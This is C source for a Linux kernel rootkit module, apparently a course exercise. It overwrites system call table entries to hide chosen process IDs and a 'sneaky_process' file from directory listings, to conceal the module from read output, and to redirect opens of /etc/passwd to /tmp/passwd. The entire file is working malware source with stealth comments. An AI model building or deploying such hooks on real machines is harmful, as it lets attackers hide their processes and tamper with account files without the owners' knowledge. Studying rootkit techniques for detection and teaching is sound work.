#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/dirent.h>
// #include <stdlib.h>
// #include <stdio.h>

#define PREFIX "sneaky_process"

static char *pid = "";
static char *pid_1 = "";
module_param(pid, charp, 0);  // to get parameter from loading

MODULE_PARM_DESC(pid, "PID of the sneaky process");  // description of parameter

module_param(pid_1, charp, 0);  // to get parameter from loading

MODULE_PARM_DESC(pid_1, "PID_1 of the sneaky process");
// int pidv = atoi(pid);
// static char pidvstr[20];
// sprintf(pidvstr,"%d",pidv-1);
//This is a pointer to the system call table
static unsigned long *sys_call_table;

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  if(pte->pte &~_PAGE_RW){
    pte->pte |=_PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  pte->pte = pte->pte &~_PAGE_RW;
  return 0;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);

// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
{
  if(strcmp((const char *)regs->si, "/etc/passwd") == 0){
    copy_to_user((void*)((const char *)regs->si), "/tmp/passwd", strlen("/tmp/passwd"));
  }

  return original_openat(regs);
}

asmlinkage int (*original_read)(struct pt_regs *);

asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs)
{
  ssize_t res = (ssize_t)original_read(regs);
  char *temp = (char *)regs->si;
  char *start = NULL;
  char * end = NULL; 

  if (res <= 0)
  {
    return res;
  }

  start = strstr(temp, "sneaky_mod ");
  if(start == NULL){
    return res;
  }


  end = strchr(start, '\n');
  if(end==NULL){
    return res;
  }else{
    end++;
    memmove(start, end, temp + res - end);
    res -= (ssize_t)(end - start);
  }

  return res;
  
}

asmlinkage int (*original_getdents64)(struct pt_regs *);
asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs)
{
  int res = original_getdents64(regs);
  struct linux_dirent64 *dirp = (struct linux_dirent64 *)regs->si;
  struct linux_dirent64 *cur = dirp;
  int offset = 0;


  if (res <= 0)
  {
    return res;
  }

  while (offset < res)
  {
    if ((strcmp(cur->d_name, pid) == 0)||(strcmp(cur->d_name, pid_1) == 0) ||(strcmp(cur->d_name, PREFIX) == 0))
    {
      memmove(cur, (char*)((char*)cur + cur->d_reclen), (int)((void*)dirp + res - (void*)((char*)((char*)cur + cur->d_reclen))));
      res -= cur->d_reclen;
      continue;
    }
    offset += cur->d_reclen;
    cur = (struct linux_dirent64 *)((char *)cur + cur->d_reclen);
  }

  return res;
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  printk(KERN_INFO "pis: %s\n", pid);
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *)sys_call_table[__NR_openat];
  original_getdents64 = (void *)sys_call_table[__NR_getdents64];
  original_read = (void *)sys_call_table[__NR_read];

  
  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);
  
  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;


  // You need to replace other system calls you need to hack here
  
  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
  sys_call_table[__NR_read] = (unsigned long)original_read;


  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);  
}  



module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
MODULE_LICENSE("GPL");